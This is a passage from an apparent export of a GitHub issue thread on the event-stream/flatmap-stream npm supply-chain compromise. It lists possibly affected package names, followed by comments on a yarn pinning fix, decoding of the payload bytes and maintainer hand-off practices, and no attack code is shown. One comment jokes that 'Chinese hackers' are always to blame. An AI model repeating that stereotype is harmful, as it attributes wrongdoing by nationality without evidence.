[""3vot-clay"",""abacus-mddoc"",""adifserializer"",""adobe-live-stream-connector"",""ainojs-build"",""ajpeg"",""ajson"",""akurath"",""alamo"",""alfred2"",""all-the-packages"",""allsome"",""alphax"",""ampeye-cli"",""angular-build"",""angular-dependency"",""angular-gulp-starter-api"",""angular-html2js"",""angular-kickoff"",""angular-suggestbox"",""angular-ui-publisher"",""angulpar"",""animas-diasend-data"",""another"",""antz"",""ap_utils"",""apacheconf"",""ape-gulp"",""api-bittrex"",""appcenter-cli"",""appirio-gulp-tasks"",""approvals"",""apptension-tools"",""ari"",""assembler-cli"",""assets-tasks"",""athena-beta"",""athena-html"",""athena-mate"",""au-base"",""au-mine"",""auto-sequelize-define"",""autodoc_compiler"",""automerger"",""axiscam"",""azure-cli"",""babel-bundle"",""badass"",""banger"",""banoffee"",""barbakoa"",""base-test-suite"",""battleunpack"",""baucis"",""baucis-csv"",""baucis-decorator-deep-select"",""baucis-json"",""baucis-json-strict"",""bce"",""bespoke-to-pdf"",""bezier-stream"",""big-bertha"",""bikeshed"",""binary-stream"",""binder-logging"",""bit-bundler"",""blake"",""blanc"",""blastoise-shell"",""blender"",""blether"",""blockapps-bloc"",""blockflow"",""blocklog"",""boar-tasks"",""boar-tasks-client"",""boilerplate-gulp-angular"",""boilerplate-gulp-angular-sass"",""botstream"",""bran"",""bratwurst"",""broadcreek"",""brocode"",""browser-perf"",""browser-stream"",""browserify-unpack"",""btron"",""bts-gulp-tasks"",""bufferize"",""bufftracker"",""bugs"",""bunyan_cloudwatch"",""bunyan-debug"",""cacherjs"",""caf_iot_http"",""cameio"",""camera"",""carfin-build"",""cargoship"",""cargoship-modules"",""cargoship-status"",""carlopress"",""cascadia"",""cc-import-xml-writer"",""centurion"",""cerebro-mac-apps"",""cgfx-build-tools"",""chardata-generator"",""checklist-ninja"",""ci-build"",""claycli"",""cleverstack-cli"",""clift"",""cloudqw-expired"",""coalescent"",""code-notes"",""codebox"",""coderetreat"",""colored"",""common-assets"",""compages"",""component-search2"",""condensation"",""connect-file"",""convolvr"",""copy_diff"",""corballis-build"",""cortex-cli"",""couch-copy"",""couch-stream"",""couch-streams"",""couchdb-bulk"",""couchdb-mkdb"",""couchdb-mkuser"",""couchmagick-listen"",""couchmagick-stream"",""cq-cli"",""cr2checkstyle"",""create-raid-app"",""css-connector"",""csv-query"",""ct-platform-backend"",""ctags"",""custom-gulp-sass-inheritance"",""cxla"",""cyb-cli"",""dashn"",""datapipes"",""dbus-native"",""dbus-native-async"",""dbus-native-windows"",""dcm-dfa-wdc"",""defaultStr"",""delete-lines-using-string"",""detourn"",""devdoo"",""devtools-live"",""devtools-live-browserify-unpack"",""display-focus"",""diz"",""dk_2018_1_1"",""dkevents"",""dm-server"",""dnschain"",""dnsimple-cli"",""docker-api"",""docker-compose-command-center"",""docker-delta"",""docker-js"",""docker-logs"",""docker-qemu-transpose"",""docker-shell"",""docker-storage-gc"",""docker-toolbelt"",""docker-workspace"",""dockerscript"",""docparse-dumpinvoices"",""doczen-convert"",""dr-comp-package"",""dr-frankenstyle"",""dr-frankenstyle-win"",""ds-build"",""ds-pack"",""dstore-elasticsearch"",""dstore-leveldb"",""dstore-postgresql"",""dumbjs"",""dunder-streams"",""duniter"",""duniter-bma"",""duniter-ui"",""ea-csv"",""ea-lib"",""ea-open-in-browser"",""ea-readline"",""ea-xspf"",""earstream"",""easy-beautify"",""easy-builder"",""easy-gulp-by-orel"",""ecrit"",""eightylegs"",""electric"",""electron-license"",""elgg-conventional-changelog"",""elm-stdio"",""elsinore-io"",""email-builder-core"",""ent-assets"",""envoy-holly"",""es-get-ids"",""eshot"",""eslint-tool-test-files"",""esrest"",""etc-hosts"",""ethelo-deploy"",""event-swarm"",""express-api-slush"",""express-send-stream"",""faces"",""facilmap-frontend"",""facilmap-server"",""factorio-control-panel"",""fakestream"",""fepper"",""ff-build"",""file-fuser"",""fit-facebook"",""fitzroy.js"",""fixed-stream"",""fixme"",""fixme-to-issue"",""fj"",""fli-webtask"",""flow-iqr"",""flow-median"",""flow-quantiles"",""flow.io"",""fluentflow"",""fmbaucis"",""force-dev-tool"",""force-dev-tool-cep"",""fpcalc"",""frakture-workerbots"",""frau-publisher"",""front-end-work-flow"",""front-render"",""fxos-console-logs"",""fyogametable"",""gabbro"",""gastropod"",""generator-wikismith"",""generator-wpzest"",""genoset-238"",""geocsv"",""geoip-resolve"",""geojson-polyline"",""geojson-to-mongo"",""geojson2postgres"",""geomash"",""geometer"",""geoplaces"",""geotrie"",""get-json-hq"",""ghost-helm"",""git-file"",""git-modules"",""github-travis-report"",""gix-npm-server"",""glazed"",""glean-gulp"",""glob-equal"",""global-couch-stream"",""glp-rel"",""glyder"",""gnippy"",""gobblefunk"",""gramophone"",""graphcool-cli-core"",""grock"",""grunt-azure-sync"",""grunt-underscore-jst"",""gtb"",""gulp-absolute-image"",""gulp-acute"",""gulp-add-src"",""gulp-advanced-csv-to-json"",""gulp-adwords"",""gulp-aggregate"",""gulp-agnitio-templatecache"",""gulp-ali-oss"",""gulp-am-transport"",""gulp-ams3"",""gulp-amw-dest"",""gulp-angular-dependency"",""gulp-angular-injector"",""gulp-angular-json"",""gulp-angular-protractor"",""gulp-angular-svg-d"",""gulp-angular-templatecache"",""gulp-angular-templatecache-hf"",""gulp-angular-templatecache-n3utrino"",""gulp-angular-templatecache-noconcat"",""gulp-angular-translate"",""gulp-angular-translate-bitposter"",""gulp-angular-translate-es6"",""gulp-angular-workflow"",""gulp-anti-cache"",""gulp-app-clonify"",""gulp-appcache"",""gulp-append-rev"",""gulp-appendit"",""gulp-apply-template"",""gulp-asvn"",""gulp-async-assets"",""gulp-async-ng-templatecache"",""gulp-atom-electron"",""gulp-atomizer"",""gulp-attr-remover"",""gulp-autoprefixer-html"",""gulp-awesome-electron"",""gulp-aws-s3"",""gulp-azure-deploy"",""gulp-azure-storage"",""gulp-bailey"",""gulp-based-front-end-preprocessor"",""gulp-batch-replace"",""gulp-batman-templates"",""gulp-better-sass-inheritance"",""gulp-bookmarkify"",""gulp-bootsie"",""gulp-bower-css-task"",""gulp-bower-dist"",""gulp-browser-notification"",""gulp-bst-typedoc"",""gulp-build-bitrix-modul"",""gulp-build-index"",""gulp-byo-jslint"",""gulp-cache-buster"",""gulp-cache-manifest"",""gulp-change"",""gulp-clean-old"",""gulp-cleanhtml"",""gulp-clientappcompile"",""gulp-clientjade"",""gulp-closure-jade"",""gulp-cloudfiles"",""gulp-cloudfront"",""gulp-cloudfront-improved"",""gulp-cloudfront-with-error"",""gulp-cmd-build"",""gulp-cmd-cct"",""gulp-cmd-concat"",""gulp-cmd-packer"",""gulp-cmd-trans"",""gulp-cmd-transport"",""gulp-cmd-transport-nowcoder"",""gulp-cmd-transport2"",""gulp-cmd-trs"",""gulp-cms-prep"",""gulp-cmsref"",""gulp-codekit"",""gulp-codekit-extended"",""gulp-commonjs"",""gulp-commonjs-wrapper"",""gulp-compass-base64"",""gulp-compile-js"",""gulp-compiler"",""gulp-config2"",""gulp-connect"",""gulp-connect-aster"",""gulp-connect-ex"",""gulp-connect-multi"",""gulp-connect-pm2"",""gulp-connect2"",""gulp-convert"",""gulp-copycat"",""gulp-css-flip"",""gulp-css-overrides"",""gulp-css-validator"",""gulp-cssabsoluteurl"",""gulp-csslint-latest"",""gulp-csslint-report"",""gulp-cssurl"",""gulp-data-uri"",""gulp-defer"",""gulp-delete-lines"",""gulp-deps"",""gulp-deps-loader"",""gulp-deps-map"",""gulp-detect"",""gulp-dev-server"",""gulp-developerconsole"",""gulp-devkit"",""gulp-devtools-live-browserify"",""gulp-devtools-live-exec"",""gulp-devtools-live-sass"",""gulp-diff"",""gulp-doc2json"",""gulp-dotcover-runner"",""gulp-downloader"",""gulp-dox-foundation"",""gulp-dr-frankenstyle"",""gulp-dump-shopify"",""gulp-durandal"",""gulp-dynamic"",""gulp-dynamic-ui-kit"",""gulp-eco-template"",""gulp-ecs-svn"",""gulp-ect"",""gulp-ect-compile"",""gulp-elementsjs-interpreter"",""gulp-embedlr"",""gulp-ember-autolocalization"",""gulp-endpoint"",""gulp-engine"",""gulp-es6-module-bundler"",""gulp-este"",""gulp-express"",""gulp-express-cb"",""gulp-ext3order"",""gulp-extend"",""gulp-extify"",""gulp-extjs-spec-generator"",""gulp-factor-bundle"",""gulp-fb"",""gulp-feed"",""gulp-file-bundle"",""gulp-file-includer"",""gulp-file-insert"",""gulp-file-to-js"",""gulp-fix-windows-source-maps"",""gulp-flow"",""gulp-flowtype"",""gulp-flowtype-opensrcken"",""gulp-folders"",""gulp-folders-4x"",""gulp-fontello-config"",""gulp-footer"",""gulp-freeze-resources"",""gulp-frep"",""gulp-fsharp"",""gulp-fuet"",""gulp-gently-removelogs"",""gulp-google-drive"",""gulp-google-sheets"",""gulp-google-spreadsheets"",""gulp-group-files"",""gulp-hasher"",""gulp-head-picker"",""gulp-header-git"",""gulp-here"",""gulp-highwinds"",""gulp-hint-not"",""gulp-hjson"",""gulp-hogan"",""gulp-hot-ng-templates"",""gulp-href-rewrite"",""gulp-html-autoprefixer"",""gulp-html-bower"",""gulp-html-dependencies"",""gulp-html-extend"",""gulp-html-file-to-directory"",""gulp-html-header-footer"",""gulp-html-minifier"",""gulp-html-minifier2"",""gulp-html-prettify"",""gulp-html-to-json"",""gulp-html-to-template"",""gulp-html-validator"",""gulp-html2jade"",""gulp-html2md"",""gulp-html2txt"",""gulp-htmlbuild"",""gulp-htmlpostcss"",""gulp-i18n-swig"",""gulp-iced"",""gulp-iced-coffee"",""gulp-ids-deps"",""gulp-ignite-sitecore"",""gulp-image2base64"",""gulp-imports"",""gulp-inc"",""gulp-include"",""gulp-include-2"",""gulp-include-ext"",""gulp-include-more"",""gulp-include-templated"",""gulp-indexify"",""gulp-inheritance"",""gulp-inject"",""gulp-inject-element"",""gulp-inject-file"",""gulp-inject-partials"",""gulp-inject-reload"",""gulp-inject-scss"",""gulp-inject-string"",""gulp-inject-svg"",""gulp-injector"",""gulp-inline"",""gulp-inline-angular-templates"",""gulp-inline-autoprefixer"",""gulp-inline-base64"",""gulp-inline-style"",""gulp-inlinebase64"",""gulp-inno"",""gulp-insecurity"",""gulp-insert-lines"",""gulp-intercept"",""gulp-istanbul-reports"",""gulp-istanbul-untested-coverage"",""gulp-jade-client"",""gulp-jade-inheritance"",""gulp-javascript-stylus-sprite"",""gulp-jisp"",""gulp-js-beaut"",""gulp-js-beautify"",""gulp-js-include"",""gulp-js-inheritance"",""gulp-js-prettify"",""gulp-js2coffee"",""gulp-jsbeautify"",""gulp-jsdox-struct"",""gulp-json-angular-translate"",""gulp-json-config"",""gulp-json-refs"",""gulp-jsont"",""gulp-jstransform"",""gulp-juice"",""gulp-just-copy"",""gulp-karma"",""gulp-karma-2"",""gulp-karma-run"",""gulp-karma2"",""gulp-knockout-templates"",""gulp-kw-optimize"",""gulp-l10n-extract"",""gulp-less-base-import"",""gulp-less-with-progress"",""gulp-less2sass"",""gulp-library-umd"",""gulp-license-check"",""gulp-lintspaces"",""gulp-litmus"",""gulp-live-server"",""gulp-livereload"",""gulp-livereload-2"",""gulp-logwarn"",""gulp-lsn-angular-file-sorter"",""gulp-lsn-ng-templates"",""gulp-markup-transformer"",""gulp-mau"",""gulp-mdox"",""gulp-mediawiki"",""gulp-min"",""gulp-min-map"",""gulp-minio"",""gulp-mjs"",""gulp-mjs-conventions"",""gulp-module-system"",""gulp-move-tags"",""gulp-mspec-runner"",""gulp-multi-renderer"",""gulp-nekyll"",""gulp-neuron-builder"",""gulp-ng-classify"",""gulp-ng-inline-templates"",""gulp-ng-json"",""gulp-ng-jsoncache"",""gulp-ng-pug-to-inline"",""gulp-ng-template-cache"",""gulp-ng-template-strings"",""gulp-ng-templates"",""gulp-ng-tpl-cache"",""gulp-ng-translation"",""gulp-nico-prebuild"",""gulp-nightwatch"",""gulp-node-inspector"",""gulp-nodemon"",""gulp-nodemon-local"",""gulp-nodemon-tempfix"",""gulp-nodemon-version"",""gulp-noopener"",""gulp-noprotocol"",""gulp-nunit-runner"",""gulp-oss"",""gulp-packer"",""gulp-packpas"",""gulp-partial-to-script"",""gulp-path-modifier"",""gulp-path-prefix"",""gulp-path-to-animation"",""gulp-patternlint"",""gulp-phpmetrix"",""gulp-piece"",""gulp-pipemin"",""gulp-pipereplace"",""gulp-pogo"",""gulp-power-doctest"",""gulp-prefix-css"",""gulp-progress"",""gulp-prompt"",""gulp-prompt-async"",""gulp-protractor"",""gulp-protractor-burked"",""gulp-prune-html"",""gulp-pug-inheritance"",""gulp-pulichomeport-prebuild"",""gulp-qmlweb"",""gulp-query-html"",""gulp-rabbit-template"",""gulp-razilocomponent"",""gulp-razor-emailer"",""gulp-react-component-library"",""gulp-react-template"",""gulp-recipe-loader"",""gulp-refresh"",""gulp-remote"",""gulp-remote-src"",""gulp-remote-src-vscode"",""gulp-remove-html"",""gulp-remove-line"",""gulp-remove-lines"",""gulp-removelogs"",""gulp-renvy"",""gulp-replace-assets"",""gulp-replace-path"",""gulp-replace-ref"",""gulp-replaces"",""gulp-require"",""gulp-require-angular"",""gulp-require-convert"",""gulp-require-file"",""gulp-require-rjs"",""gulp-require-src"",""gulp-requirejs"",""gulp-requirejs-bp"",""gulp-requirejs-bundle"",""gulp-requirejs-bundler"",""gulp-requirejs-bundler-quark"",""gulp-requirejs-bundler-with-baseurl"",""gulp-requirejs-cdnbundler"",""gulp-requirejs-chain"",""gulp-requirejs-packages-dep"",""gulp-requirejs-updated"",""gulp-requirejs-wrap-text"",""gulp-requirejs2"",""gulp-requirerc"",""gulp-res-to-hash"",""gulp-resource"",""gulp-rest-emulator"",""gulp-rest-emulator-whyfly"",""gulp-rev-append"",""gulp-rev-append-custom"",""gulp-rev-append-fixed"",""gulp-rev-append-fork"",""gulp-rev-append-modify"",""gulp-rev-append-opt"",""gulp-rev-append-path"",""gulp-rev-append-plus"",""gulp-rev-append-song"",""gulp-rev-append-wc"",""gulp-rev-append-xdf"",""gulp-rev-append-ysb"",""gulp-rev-replace-batchreplace"",""gulp-rev-stamp"",""gulp-rev-timestamp"",""gulp-reversion"",""gulp-rewrite-css"",""gulp-rewrite-resources"",""gulp-rgcsspack"",""gulp-rgswig"",""gulp-rigger"",""gulp-rjs"",""gulp-rjs-optimizer"",""gulp-roro"",""gulp-rss"",""gulp-rss-duplicate"",""gulp-s3"",""gulp-s3-deploy"",""gulp-s3-gzip"",""gulp-s3-index"",""gulp-s3-ls"",""gulp-s3-upload"",""gulp-s3-util"",""gulp-sass-generate-contents"",""gulp-sass-inheritance"",""gulp-sass-inheritance-plus"",""gulp-sass-multi-inheritance"",""gulp-scope-css"",""gulp-script-inject"",""gulp-scss-lint"",""gulp-scsslint"",""gulp-sea-build"",""gulp-sea-combo"",""gulp-seajs"",""gulp-seajs-combine"",""gulp-seajs-package-js"",""gulp-seajs-trs"",""gulp-selectors"",""gulp-sendgrid"",""gulp-sharp"",""gulp-sharp-peer"",""gulp-slate"",""gulp-sloc"",""gulp-sloc2"",""gulp-sloc4"",""gulp-softlayer-storage"",""gulp-spa"",""gulp-spa-map"",""gulp-spa-modify"",""gulp-spritesmith"",""gulp-sprockets"",""gulp-src-combine"",""gulp-src-ex"",""gulp-string-thing"",""gulp-strip-code"",""gulp-strip-module"",""gulp-strip-react-dom-comment"",""gulp-stripmq"",""gulp-stubby-server"",""gulp-style-prototype"",""gulp-styleguide"",""gulp-stylus-sprite"",""gulp-subtree"",""gulp-subtree-only"",""gulp-svg-inject"",""gulp-svgedit"",""gulp-swagger-endpoint"",""gulp-sweetjs"",""gulp-swiffy-banner"",""gulp-swig"",""gulp-swig-compiler-renderer"",""gulp-swig-stylebundler"",""gulp-symdest"",""gulp-task-factory"",""gulp-template-expansion-css-less"",""gulp-template-expansion-script-coffee"",""gulp-template-resource"",""gulp-template-servlet-expansion"",""gulp-template-util"",""gulp-test"",""gulp-testem"",""gulp-timestamp-append"",""gulp-tiny"",""gulp-tinypng"",""gulp-tinypng-plugin"",""gulp-tmpl"",""gulp-token-replace"",""gulp-transform-head"",""gulp-transform-selectors"",""gulp-transport-cmd"",""gulp-tree"",""gulp-tsc-autoref2"",""gulp-twoside"",""gulp-typedoc"",""gulp-typescript-easysort"",""gulp-typescript-filesort"",""gulp-umd-rrc"",""gulp-uncss-task"",""gulp-untar"",""gulp-untar2"",""gulp-upload-s3"",""gulp-upyun"",""gulp-user-story"",""gulp-useref"",""gulp-useref-assets"",""gulp-useref-min"",""gulp-useref-plus"",""gulp-useref-sfbest"",""gulp-userefconcat"",""gulp-velocity"",""gulp-velocityjs"",""gulp-version-append"",""gulp-version-replace"",""gulp-viewcache"",""gulp-vinyl-untar"",""gulp-vinyl-zip"",""gulp-war"",""gulp-watch-jade"",""gulp-watch-pug"",""gulp-web-dependencies"",""gulp-web-modules"",""gulp-webpack-config"",""gulp-webpack-project"",""gulp-wrap-amd-infer"",""gulp-wrap-define"",""gulp-wrap-layout"",""gulp-wrappy"",""gulp-xliff-to-carbon-i18n"",""gulp-xslt"",""gulp-xunit-runner"",""gulp-zabcache"",""gulpfile-ninecms"",""gulpinator"",""gulpist"",""gulpman"",""gulpury"",""gwm-config"",""gwm-handlebars"",""harian"",""hawtio-node-backend"",""hbbbs-test"",""hexo-migrator-tryghost"",""hifo-stream"",""hipper"",""hipster"",""hm-gismap-gulp"",""hm-gulp-ng-tool"",""hornet-js-builder"",""hot-builder-cg"",""hot-reloading-proxy"",""html5-media-converter-fixed-size"",""http-live-server"",""http-time"",""httpsnippet"",""httpsnippet-fsless"",""huba-gramophone"",""hubot-config"",""hunterchristian-browser-perf"",""hyperbolts-compiler"",""hypnotable-footer"",""ice-stream"",""icejaw"",""ideohint"",""idhedit"",""ifc2json"",""igem-wikibrick"",""ima-gulp-tasks"",""ima.js-gulp-tasks"",""img.bi-server"",""in-d-gestion"",""indui"",""indui-app-lib"",""insomnia-httpsnippet"",""instacryjs"",""intent-tools"",""intercom-stream"",""intercom-to-mongodb"",""ionic-app-lib-no-cordova-mock"",""ionic-no-cordova-mock"",""ionic-run-external-address"",""irie-utils"",""ironmq-stream"",""iso19139"",""isz"",""iterate-multiple-files"",""iterator-streams"",""jabher-gulpfile"",""jac-s3-sync-aws"",""jasmid-module"",""jasonftp"",""javascript-build-essentials"",""javascript-gulp-stylus-sprite"",""jcdecaux"",""jepret-node-tweet-stream"",""jiny"",""jive"",""jmlive-server"",""jq-stream"",""jrep"",""js-cache-factory"",""js-core-data"",""jsdox-struct"",""jsftp-for-deploy-asset"",""jsftp-modi"",""jsnbt"",""json-csv"",""json-dsv"",""json-requester"",""json-stream-formatter"",""json-stream-socket"",""json-tools"",""jspm-server"",""jw-jspm-server"",""jzd"",""jzd-cli"",""k1ngdr3w-gulp-protractor"",""kairosdb-client"",""kawa"",""kerplunk-city-autocomplete"",""kerplunk-location-history"",""kerplunk-place"",""kingdom-warehouse"",""kissy-xtemplate"",""koa-grace-app"",""koars-utils"",""koop-socrata"",""kria.vc"",""kube-client"",""kube-stream"",""kv"",""kv-redis"",""kwzy-version-replace"",""lan-chat"",""latte"",""lazynode"",""ldif-stream"",""leetspeek"",""len"",""lepew-penelope"",""level-geo"",""level-http2"",""lfa"",""lh-gulp-sprockets"",""libgrabber"",""library-utils"",""life_star-auth"",""lightlevel"",""lingon"",""lint-trap"",""lithium-sdk"",""liv-srv"",""live-server"",""live-server2"",""livecable"",""loader.io"",""loadfire"",""loci"",""logmap"",""loopback-graphql-relay"",""loopback-graphql-server"",""luminous-gulp"",""luvely"",""macerate"",""macro-chunky-temp"",""magix-combo"",""mail-all-emls"",""maiya"",""map-stream-concurrent"",""mark-stream"",""markade-server"",""markdown-api-parser"",""marked-lexer-stream"",""marketing-data-file-uploader"",""markheim"",""matryoshka.js"",""mdfind"",""mediawiki-extension"",""meetup-api"",""melifyp"",""meme-magic"",""merino"",""merlin"",""merlin-mongo"",""message-queue"",""metalsmith-csv"",""mgeneratejs"",""midistream"",""mixpanel-export"",""mlv1"",""mmjd-gulp-este"",""mobile-center-cli"",""modern-web-dev-build"",""modulizr-gulp"",""modverify"",""monacore"",""mongo-chug"",""mongo-collection"",""mongo-collection-fake"",""mongodb-collection-sample"",""mongodb-dataset-generator"",""mongodb-datasets"",""mongodb-extended-json"",""mongodb-importer"",""mongodb-js-repo-list"",""mongodb-schema"",""mongodb-schema-simulator"",""mongodb-scope-client"",""mongodb-scope-server"",""mongoose-event-logger"",""mongoscope-importer"",""monkey-zuora-soap"",""morefun-pomelo-daemon"",""morelikethis"",""mpg123"",""mpg321"",""mssqlx"",""mumpitz"",""murtignip"",""mustache-stream"",""muzzley-client"",""mysql-to-bigquery"",""myth-cli"",""nappy"",""ndxdb"",""netmorphic"",""neyka"",""nf-conventional-changelog"",""ng-mural-patterns-inject"",""ng-mural-patterns-tree"",""ninit"",""nixar"",""nlp-toolkit"",""no-one-left-behind"",""no-server"",""node-app-review-time"",""node-bird-routeparse"",""node-build-web-app"",""node-es-transformer"",""node-event-store"",""node-event-store-redis"",""node-gypd"",""node-intelhex"",""node-itunes-rss-data"",""node-leaky-recursive"",""node-nutch"",""node-nutcracker"",""node-piper"",""node-red-contrib-bigexec"",""node-red-contrib-bigssh"",""node-red-contrib-orion"",""node-red-contrib-trello"",""node-red-contrib-trello-functions"",""node-sequential-file"",""node-staticize"",""node-storm"",""node-stream-cache"",""node-tipbot-api"",""node-tweet-cli"",""node-tweet-stream"",""node-youtubedl"",""node.cryptopia"",""nodejs-lib"",""nodeunit-to-tape"",""nodewebx-server"",""nodewebx-server-lite"",""norma-javascript"",""npipe"",""npm-bomb"",""npm-kludge-search"",""npm-stats"",""nqm-databot-host"",""nqm-databot-store"",""nqm-json-import"",""nuga"",""nuget"",""nuget-in-path"",""numeral-cli"",""nuttin"",""nw-nerdlayoutjs"",""nws-ahps-gauges"",""objfuscate"",""ocean-stream"",""offline-conversions-file-uploader"",""ole-doc"",""omneedia"",""onixcore"",""oonimap"",""openni-browser"",""ordered-merge-stream"",""org2invoice"",""page-api-to-stream"",""page-rank-for-qiita"",""paged-http-stream"",""pageinfo"",""pagelang"",""pancakes-syrup"",""papyri"",""parse-table"",""pcap-sanitizer"",""pcky-algorithms"",""peach_html_production"",""peach-html-generate"",""peers"",""pegakit-build-tools"",""permutation-stream"",""person"",""phantom-proxy"",""photonsh"",""picture-tube"",""pip-webui-tasks"",""pipedreams1"",""pivi"",""pkp"",""placeholderjs"",""pleeb"",""plugins"",""plus.cloud"",""plus.shell"",""podr-server"",""pome-daemon"",""pomelo-daemon"",""portal.pathwar.net"",""powr-utils"",""prefab"",""premailer-gulp-juice"",""prettypipe"",""primgulp"",""primus-cat"",""printlncs"",""probo"",""probo-proboscis"",""prompt-cli"",""prompt-sui"",""prossh"",""ps-tree"",""ps-tree-ce"",""pslplus"",""pt-gulp-requirejs"",""puppyjs"",""pure-cjs"",""pushover-f"",""pushstate-asset-server"",""pype"",""qq-mht-into-emls"",""queryp"",""rapid-build"",""raynos-testling"",""react-jsx-anywhere"",""react-stdio"",""reactator-build"",""reaktor"",""realm-js"",""recombine-gulp-protractor"",""redis-raw"",""redis-stream"",""redis-stream-store"",""redshed"",""redux-cluster"",""registry-static"",""remove-ps-dir"",""replace-stream"",""replay-event-stream"",""reproject"",""require-stream"",""requirejs-stream"",""resin-docker-build"",""resin-plugin-img"",""resin-preload-image"",""resin-stream-logger"",""rest-collection-stream"",""restify-git-json"",""rets.js"",""rev-append"",""reviewable-enterprise-tools"",""rise-gulp"",""river-event-stream"",""rollsum-split"",""rplcr"",""rpmbuild"",""rssspider"",""rump-scriptsify"",""rwh"",""s3-sync"",""s3-sync-aws"",""s3-sync-nooma"",""sand-google-storage"",""sapphire"",""save"",""save-mongodb"",""save-usergrid"",""sblog"",""sc-gulp-tasks"",""scaffoldery"",""scansafe"",""schwab"",""seaport-stream"",""sear"",""secret-service"",""secure-peer"",""see"",""segio"",""semverify"",""serval-backbone"",""sfdhanautohint"",""sgc-free"",""sgvdata"",""shadow-npm"",""sheepskin"",""shipment"",""shout"",""shuo"",""sitedown"",""skelleton-framework-core"",""skiff-transport-json"",""slideshow"",""slidevs"",""slot"",""slush-express-rest"",""slush-webix"",""smasher"",""smileycore"",""snob"",""snowplow-enrich"",""solrjs"",""solver"",""source-stream"",""spock"",""springbokjs-base-next"",""spun"",""src-import"",""src-import-curt"",""sre-gulp-rjs"",""sssg"",""static-component-browser"",""static-website-pack"",""static2000"",""staticr"",""strainer"",""stream-buffered-writer"",""stream-inspect"",""stream-map-series"",""stream-playground"",""stream-queue"",""stream-scheduler"",""streamfire"",""streamly"",""strider-docker-runner"",""strider-docker-slave"",""stylus-blocks-compiler"",""svg-scaler"",""t-compiler"",""t-eye"",""tables"",""tap-object-stream"",""tee-stream"",""tentacles-streams"",""testem-node"",""testem-testling-adapter"",""testim"",""tfworks-elixir-modules"",""tfworks-js"",""threax-gulp-tk"",""thug-couch"",""thumbsup"",""tidepool-animas-diasend-data"",""tidepool-dexcom-stream"",""tidepool-mmcsv-carelink-data"",""tilelivestream"",""tilerator-jobprocessor"",""tim-s3-upload"",""timequerylog"",""timetable"",""tinker"",""tnz-pattern-library"",""todue-txt"",""topsoil"",""tr-jspm-server"",""trac-base64"",""transcript-parser"",""transfuse"",""trial-client"",""trustnote-pow-miner"",""ts-merge"",""ts3query"",""tsd-web"",""tsstore"",""turbo-cli"",""turner"",""tweet-pipe"",""twitter-cli"",""twitter-ebooks-corpus-builder"",""twitterfollowerexplorer"",""tylr"",""ucoin"",""ukiyoe-models"",""ummon-server"",""upd"",""url-stream"",""urlfuzz"",""user-gate"",""usfm-validator"",""uvw-live-server"",""vantage-infusion"",""verb"",""via-websites"",""vinus"",""vinyl-amqp"",""vinyl-dat"",""vinyl-evernote"",""vinyl-mail"",""vinyl-phantomic"",""violat"",""vnm"",""voice2txt"",""vscode-nls-dev"",""vssln-parser"",""wainwright"",""wainwright-ab"",""walter"",""watch-server"",""watfish"",""wc-file-include"",""wc-starterkit"",""wdft-geojson"",""weather-alerts-parser"",""weatherman"",""web-build-tasks"",""web-server-manager"",""webcommand"",""webcommand-express"",""webpack-minio-plugin"",""what-mac"",""wiki-plugin-txtzyme"",""wiki-server"",""wiki-storage-leveldb"",""wikipedia-edit-stream"",""wikiship"",""wikismith"",""wikismith-bs3"",""wikismith-site"",""wingbot-cli"",""wires-domain"",""wisebed.js-scripts"",""wjet"",""wmctrl"",""word-extractor"",""wowbuddy-itemregistry"",""wowbuddy-miner"",""wp-blank-scripts"",""write-code"",""wzeditor-word-rules-parser"",""x-site-common-web"",""xirsys"",""xirsys-cortex"",""xpm2"",""xtx"",""ymb"",""yoom"",""youtube-search-cli"",""zell-grr"",""zellsprite"",""zpm"",""zpresent-injector"",""ztreamy-client"",""zuora-soap""]
```"
1648	"It's ironic that the ""update all packages without thinking"" way of package management got us into this mess but once libraries are updated it'll largely get us OUT of this mess. 😅"
1649	"> In the case of OSS as it currently stands many companies/people are happy to freely use but not so happy to contribute (financially or otherwise). Social culpability works both ways. So you pay in risk, or you pay in auditing hours.

Or with your BTC (?)

"
1650	"Hey so didn't see anyone post fixes other than upgrading in the long thread but if you are using yarn, you can consider using [`resolutions`](https://yarnpkg.com/lang/en/docs/selective-version-resolutions/) to make it force transitive dependencies of `event-stream` to use a specific version. Someone correct me if I'm wrong. 

Thanks @ilias-t for the tip!

```
  ""resolutions"": {
    ""**/event-stream"": ""3.3.4""
  }
```

Also use `yarn why flatmap-stream` to verify if you have any dependencies that use it still."
1651	"It's ironic that the ""update all packages without thinking"" way of package management got us into this mess but once libraries are updated it'll largely get us OUT of this mess. 😅"
1652	"> Maybe letting the maintainer provide the minified source is a problem, too?

I forreal-forreal agree with this. Auto-generate that stuff on package pushes; Provided minified versions always seemed like a security issue"
1653	@bobber205, you commented twice ([comment 1](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441817199), [comment 2](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441817904)). Don't know why GitHub keeps throwing the error, unless everyone viewing this issue right now causes strain on their servers (??).
1654	"> @bobber205, you commented twice ([comment 1](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441817199), [comment 2](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441817904)). Don't know why GitHub keeps throwing the error, unless everyone viewing this issue right now causes strain on their servers (??).

OMG I am so sorry!"
1655	" 🙊It proofs again is so easy to push ""vulnerable"" code to public repo. "
1656	"No, not your fault, it's happened to someone else too. Whenever I make a comment, it says:

![""You can't comment at this time.""](https://user-images.githubusercontent.com/24855774/49045253-6ebff200-f19e-11e8-95f1-caa5588cd0fb.png)

While writing this comment, @Funfun also did the same thing:

![Duplicate comments](https://user-images.githubusercontent.com/24855774/49045293-8eefb100-f19e-11e8-93c8-ad3ee308b9d2.png)

(and sorry for making this go off-topic)"
1657	"It's always those pesky Chinese hackers

*Edit: This is a joke, not a political statement. Chill out.*"
1658	"Please, stop commenting unless you have a real, forensic investigation to share.

Github isn't Twitter. Thank you.

![image](https://user-images.githubusercontent.com/9406403/49045682-fc690500-f1d1-11e8-931a-a04eeb9638af.png)
"
1659	"> dominictarr: he emailed me and said he wanted to maintain the module, so I gave it to him. I don't get any thing from maintaining this module, and I don't even use it anymore, and havn't for years.

This statement is drawing a lot of fire. I think the community would benefit from a ""best practices for handing off repos"" section to this guide:
https://opensource.guide/best-practices/
https://github.com/github/opensource.guide/"
1660	"If you throw that byte stream into a [hex-to-ascii converter](https://www.rapidtables.com/convert/number/hex-to-ascii.html), the line format looks like encoded script.
At the end is the ascii string: ""cryptoenvnpm_package_description""
"
1661	"@nathanl brings up a valid point I'm surprised I haven't seen before.

